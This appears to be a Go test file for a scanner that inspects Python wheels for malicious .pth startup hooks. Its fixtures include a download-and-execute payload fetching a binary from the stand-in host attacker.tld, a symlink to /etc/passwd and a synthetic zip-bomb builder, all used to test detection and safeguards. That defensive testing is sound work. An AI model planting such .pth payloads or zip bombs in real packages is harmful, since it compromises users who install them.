package wheel_test

import (
	"archive/zip"
	"bytes"
	"fmt"
	"os"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan"
	"github.com/brynbellomy/veto/internal/pthscan/wheel"
)

func buildWheel(t *testing.T, entries map[string]string) (*bytes.Reader, int64) {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for name, content := range entries {
		fw, err := w.Create(name)
		require.NoError(t, err)
		_, err = fw.Write([]byte(content))
		require.NoError(t, err)
	}
	require.NoError(t, w.Close())
	return bytes.NewReader(buf.Bytes()), int64(buf.Len())
}

func TestInspectNoPth(t *testing.T) {
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py":              "",
		"foo-1.0.0.dist-info/METADATA": "Name: foo\n",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectDataSchemePurelibFlagsWorm(t *testing.T) {
	hadesBody := `import urllib.request, subprocess; ` +
		`urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); ` +
		`subprocess.Popen(['/tmp/bun','/tmp/_index.js'])` + "\n"
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py": "",
		"foo-1.0.0.data/purelib/ensmallen-setup.pth": hadesBody,
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
}

func TestInspectTopLevelPathOnlyClean(t *testing.T) {
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py":                   "",
		"foo-1.0.0.data/purelib/extras.pth": "some/path\nanother/path\n",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}

func TestInspectEditablePthClean(t *testing.T) {
	body := `import __editable___mypkg_0_1_0_finder; __editable___mypkg_0_1_0_finder.install()` + "\n"
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py": "",
		"foo-0.1.0.data/purelib/__editable__.mypkg-0.1.0.pth": body,
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}

func TestInspectIgnoresUnrelatedPaths(t *testing.T) {
	// A .pth-like name inside a tests dir or somewhere outside the data
	// scheme must not be evaluated as a startup hook.
	r, n := buildWheel(t, map[string]string{
		"foo/tests/fixtures/sample.pth": "import urllib.request",
		"foo/__init__.py":               "",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}

// buildWheelWithSymlink constructs an in-memory wheel zip that contains a
// symlink entry pointing at a .pth name inside the data-scheme purelib
// directory. The symlink target is irrelevant for the test — we are verifying
// that the scanner skips the entry entirely rather than following / reading it.
func buildWheelWithSymlink(t *testing.T) (*bytes.Reader, int64) {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)

	// Create a benign regular .pth so Inspect has at least one entry to
	// evaluate; this confirms the scanner runs and doesn't short-circuit.
	fw, err := w.Create("foo-1.0.0.data/purelib/benign.pth")
	require.NoError(t, err)
	_, err = fw.Write([]byte("some/path\n"))
	require.NoError(t, err)

	// Craft a symlink entry whose name looks like a purelib .pth.
	// zip.Writer.CreateHeader lets us set the file header directly so we can
	// call SetMode to encode the symlink bit in ExternalAttrs.
	hdr := &zip.FileHeader{
		Name:   "foo-1.0.0.data/purelib/evil-symlink.pth",
		Method: zip.Store,
	}
	hdr.SetMode(os.ModeSymlink | 0o777)
	fw2, err := w.CreateHeader(hdr)
	require.NoError(t, err)
	// Symlink target written as content — scanner must never read this.
	_, err = fw2.Write([]byte("/etc/passwd"))
	require.NoError(t, err)

	require.NoError(t, w.Close())
	return bytes.NewReader(buf.Bytes()), int64(buf.Len())
}

func TestInspectSkipsSymlinkEntries(t *testing.T) {
	// Defense-in-depth: a symlink entry inside the purelib data directory must
	// be silently skipped, not read or followed. The wheel contains one benign
	// regular .pth (verdict: none) and one symlink .pth that would produce a
	// worm-like payload if its content were ever evaluated. The expected result
	// is SeverityNone — the symlink was ignored, only the benign entry counted.
	r, n := buildWheelWithSymlink(t)
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.Equal(t, pthscan.SeverityNone, v.Severity,
		"symlink entry must be skipped; if flagged, the scanner read symlink content")
}

// buildZipBombWheel constructs a synthetic zip bomb: many entries each
// containing maxPthBytes (256 KB) of a single repeating byte. Zip compression
// reduces that to nearly nothing on disk, but decompression yields the full
// byte count. The total decompressed size deliberately exceeds
// maxWheelDecompressedBytes (256 MB) to trigger the DoS guard.
//
// maxPthBytes = 256*1024 = 262144 bytes
// ceil(256 MB / 256 KB) = 1024 entries to hit the limit; we use 1025.
func buildZipBombWheel(t *testing.T) (*bytes.Reader, int64) {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	payload := bytes.Repeat([]byte{0x00}, 256*1024) // 256 KB; compresses to ~200 bytes
	const entries = 1025                             // 1025 * 256 KB = 263 MB > 256 MB limit
	for i := range entries {
		name := fmt.Sprintf("bomb-%d.data/purelib/bomb-%d.pth", i, i)
		fw, err := w.CreateHeader(&zip.FileHeader{
			Name:   name,
			Method: zip.Deflate,
		})
		require.NoError(t, err)
		_, err = fw.Write(payload)
		require.NoError(t, err)
	}
	require.NoError(t, w.Close())
	return bytes.NewReader(buf.Bytes()), int64(buf.Len())
}

func TestInspectIsPthInWheelSegmentCheck(t *testing.T) {
	// Regression: verify that segment-position matching is in effect.
	// A name like "malicious_purelib/bar.pth" contains the ".data/purelib/"
	// substring in a mangled form and should NOT match. It would have matched
	// the old strings.Contains approach if a crafted segment ended in ".data"
	// at position 0 and "purelib" followed at position 1 but without the
	// actual dist name prefix.
	//
	// Also verify: a legitimate purelib entry still matches regardless of the
	// dist/version prefix used in the .data directory name.
	tests := []struct {
		name    string
		entries map[string]string
		flagged bool // whether the worm payload should be detected
	}{
		{
			// Legitimate purelib path with worm payload — must be detected.
			name: "legit_purelib",
			entries: map[string]string{
				"foo-1.0.0.data/purelib/evil.pth": "import urllib.request, subprocess; " +
					"urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); " +
					"subprocess.Popen(['/tmp/bun'])\n",
			},
			flagged: true,
		},
		{
			// Crafted name: "not-really.data/scripts/evil.pth" — scripts is
			// NOT a sys.path destination; segment check must reject it.
			name: "scripts_dir_not_matched",
			entries: map[string]string{
				"foo-1.0.0.data/scripts/evil.pth": "import os; os.system('x')\n",
			},
			flagged: false,
		},
		{
			// Crafted segment sequence: "xpurelib/evil.pth" (no .data parent).
			// Old substring check would NOT match ".data/purelib/" here either,
			// but segment check also correctly rejects it.
			name: "fake_segment_no_data_parent",
			entries: map[string]string{
				"xpurelib/evil.pth": "import os; os.system('x')\n",
			},
			flagged: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r, n := buildWheel(t, tt.entries)
			v, err := wheel.Inspect(r, n)
			require.NoError(t, err)
			require.Equal(t, tt.flagged, v.Flagged(),
				"flagged mismatch for entry set %v", tt.entries)
		})
	}
}

func TestInspectZipBombRejected(t *testing.T) {
	// Zip-bomb DoS guard: a wheel whose total decompressed .pth bytes exceed
	// maxWheelDecompressedBytes (256 MB) must be rejected with an error rather
	// than consuming unbounded memory. The synthetic bomb uses 1025 entries of
	// 256 KB each (263 MB decompressed, ~200 KB compressed in the zip).
	r, n := buildZipBombWheel(t)
	_, err := wheel.Inspect(r, n)
	require.Error(t, err, "wheel with 263 MB of decompressed .pth content must be rejected")
	require.Contains(t, err.Error(), "decompressed size exceeds limit",
		"error should identify the decompression limit as the cause")
}
